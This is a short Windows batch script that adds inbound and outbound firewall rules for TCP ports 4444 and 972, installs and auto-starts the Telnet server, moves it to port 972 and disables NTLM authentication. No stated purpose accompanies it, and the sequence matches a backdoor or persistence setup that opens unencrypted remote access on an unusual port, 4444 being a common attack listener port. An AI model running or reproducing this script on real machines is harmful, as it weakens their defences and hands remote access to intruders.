@echo off
netsh advfirewall firewall add rule name="Allow port range" dir=out protocol=tcp localport=4444 action=allow
netsh advfirewall firewall add rule name="Allow port range" dir=out protocol=tcp localport=972 action=allow
netsh advfirewall firewall add rule name="Allow port range" protocol=tcp localport=4444 action=allow dir=IN
netsh advfirewall firewall add rule name="Allow port range" protocol=tcp localport=972 action=allow dir=IN
pkgmgr /iu:"TelnetServer"
sc config tlntsvr start= auto
tlntadmn config port=972 sec=-NTLM
net start Telnet
